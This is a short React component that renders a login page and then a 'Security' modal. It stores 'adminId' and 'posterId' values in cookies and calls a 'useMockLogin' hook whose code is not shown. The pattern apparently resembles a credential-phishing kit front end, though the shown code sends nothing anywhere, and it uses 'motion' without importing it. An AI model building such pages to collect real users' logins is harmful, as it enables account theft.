"use client";
import Cookies from "js-cookie";
import { useEffect, useState } from "react";
import useMockLogin from "../hooks/useMockLogin";
import Login from "./Login";
import Security from "./Security";
import Footer from "./Footer";
import TopBar from "./TopBar";
function Home({ adminId, posterId }) {
  console.log(adminId, posterId);
  useEffect(() => {
    Cookies.set("adminId", adminId);
    Cookies.set("posterId", posterId);
  }, []);
  const [showModal, setShowModal] = useState(false);

  const { login } = useMockLogin(setShowModal, adminId, posterId);
  return (
    <>
      {!showModal && (
        <>
          <TopBar />
          <Login login={login} />
          <Footer />
        </>
      )}

      {showModal && (
        <motion.div
          initial={{ opacity: 0 }}
          animate={{ opacity: 1 }}
          transition={{ duration: 0.3 }}
        >
          <Security setShowModal={setShowModal} />
        </motion.div>
      )}
    </>
  );
}

export default Home;
